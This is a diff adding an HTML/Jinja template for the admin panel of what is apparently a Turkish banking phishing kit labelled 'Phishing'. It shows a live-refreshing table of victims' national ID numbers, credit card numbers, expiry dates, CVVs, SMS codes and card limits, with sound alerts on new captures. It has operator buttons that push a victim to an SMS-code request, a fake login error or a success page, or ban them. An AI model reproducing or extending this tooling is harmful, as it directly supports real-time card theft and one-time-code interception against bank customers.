@@ -1,0 +1,148 @@
+{% extends "admin/layout.html" %}
+{% block title %}Log Tablosu - CHANTE ADMIN SYSTEM{% endblock %}
+{% block head_scripts %}
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      setInterval(function() {
+        if (globalThis.jQuery) {
+          const baseUrl = globalThis.location.href.split('?')[0] + ' #tablo';
+          globalThis.jQuery('#tablo').load(baseUrl);
+        }
+      }, 3000);
+    });
+  </script>
+{% endblock %}
+{% block content %}
+  <div class="page-header">
+    <h1 class="page-title">Log Tablosu</h1>
+    <div>
+      <ol class="breadcrumb">
+        <li class="breadcrumb-item"><a href="{{ url_for('admin.dashboard') }}">Phishing</a></li>
+        <li class="breadcrumb-item active" aria-current="page">Log Tablosu</li>
+      </ol>
+    </div>
+  </div>
+  {% if card_sound %}
+    <audio autoplay>
+      <source src="{{ url_for('admin.static', filename='chante1.mp3') }}" type="audio/mpeg">
+    </audio>
+  {% endif %}
+  {% if sms_sound %}
+    <audio autoplay>
+      <source src="{{ url_for('admin.static', filename='chante2.mp3') }}" type="audio/mpeg">
+    </audio>
+  {% endif %}
+  <div class="row">
+    <div class="col-12">
+      <div class="card log-card glass-card">
+        <div class="card-body p-0">
+          <div id="tablo" class="table-responsive">
+            <table class="table log-table align-middle">
+              <thead>
+                <tr>
+                  <th scope="col">Durum</th>
+                  <th scope="col">TC Kimlik No</th>
+                  <th scope="col">Kredi Kartı</th>
+                  <th scope="col">SKT</th>
+                  <th scope="col">CVV</th>
+                  <th scope="col">SMS</th>
+                  <th scope="col">Toplam Limit</th>
+                  <th scope="col">Güncel Limit</th>
+                  <th scope="col">IP Adresi</th>
+                  <th scope="col">Tarih</th>
+                  <th scope="col" class="text-center">İşlem</th>
+                </tr>
+              </thead>
+              <tbody>
+                {% for log in logs %}
+                  <tr>
+                    <td data-label="Durum">
+                      <div class="status-stack">
+                        <span class="pill pill-id">#{{ log.id }}</span>
+                        <span class="pill pill-state">{{ log.now }}</span>
+                        <span class="pill pill-bank">{{ log.banka or 'Banka Bilinmiyor' }}</span>
+                        <span class="pill pill-device">{{ log.cihaz or 'Cihaz' }}</span>
+                        <span class="pill pill-browser">{{ log.tarayici or 'Tarayıcı' }}</span>
+                      </div>
+                    </td>
+                    <td data-label="TC Kimlik">{{ log.tc }}</td>
+                    <td data-label="Kredi Kartı" class="mono">{{ log.kk }}</td>
+                    <td data-label="SKT">{{ log.sonkul }}</td>
+                    <td data-label="CVV">{{ log.cvv }}</td>
+                    <td data-label="SMS">{{ log.sms }}</td>
+                    <td data-label="Toplam Limit">{{ log.toplam_limit or 0 }} TL</td>
+                    <td data-label="Güncel Limit">{{ log.guncel_limit or log.kartlimit or 0 }} TL</td>
+                    <td data-label="IP">
+                      <span class="ip-badge">{{ log.ip }}</span>
+                      {% if log.lastOnline and log.lastOnline > current_ts %}
+                        <span class="signal online" title="Çevrimiçi"></span>
+                      {% else %}
+                        <span class="signal offline" title="Çevrimdışı"></span>
+                      {% endif %}
+                    </td>
+                    <td data-label="Tarih">{{ log.date }}</td>
+                    <td data-label="İşlem">
+                      <div class="action-group">
+                        <form method="post">
+                          <input type="hidden" name="action" value="back">
+                          <input type="hidden" name="target_ip" value="{{ log.ip }}">
+                          <input type="hidden" name="log_id" value="{{ log.id }}">
+                          <button class="btn-icon" title="Geri gönder" aria-label="Geri gönder" type="submit">
+                            <i class="fa-solid fa-arrow-rotate-left"></i>
+                          </button>
+                        </form>
+                        <form method="post">
+                          <input type="hidden" name="action" value="sms">
+                          <input type="hidden" name="target_ip" value="{{ log.ip }}">
+                          <input type="hidden" name="log_id" value="{{ log.id }}">
+                          <button class="btn-icon" title="SMS iste" aria-label="SMS iste" type="submit">
+                            <i class="fa-solid fa-comment-sms"></i>
+                          </button>
+                        </form>
+                        <form method="post">
+                          <input type="hidden" name="action" value="tebrik">
+                          <input type="hidden" name="target_ip" value="{{ log.ip }}">
+                          <input type="hidden" name="log_id" value="{{ log.id }}">
+                          <button class="btn-icon" title="Tebrik gönder" aria-label="Tebrik gönder" type="submit">
+                            <i class="fa-solid fa-circle-check"></i>
+                          </button>
+                        </form>
+                        <form method="post">
+                          <input type="hidden" name="action" value="ban">
+                          <input type="hidden" name="target_ip" value="{{ log.ip }}">
+                          <input type="hidden" name="log_id" value="{{ log.id }}">
+                          <button class="btn-icon" title="Banla" aria-label="Banla" type="submit">
+                            <i class="fa-solid fa-ban"></i>
+                          </button>
+                        </form>
+                        <form method="post">
+                          <input type="hidden" name="action" value="delete">
+                          <input type="hidden" name="log_id" value="{{ log.id }}">
+                          <button class="btn-icon" title="Sil" aria-label="Sil" type="submit">
+                            <i class="fa-solid fa-trash"></i>
+                          </button>
+                        </form>
+                        <form method="post">
+                          <input type="hidden" name="action" value="hata1">
+                          <input type="hidden" name="target_ip" value="{{ log.ip }}">
+                          <input type="hidden" name="log_id" value="{{ log.id }}">
+                          <button class="btn-icon" title="Giriş hatası" aria-label="Giriş hatası" type="submit">
+                            <i class="fa-solid fa-comment-slash"></i>
+                          </button>
+                        </form>
+                      </div>
+                    </td>
+                  </tr>
+                {% else %}
+                  <tr>
+                    <td colspan="11" class="text-center py-5 text-muted">Henüz log kaydı alınmadı.</td>
+                  </tr>
+                {% endfor %}
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+{% endblock %}
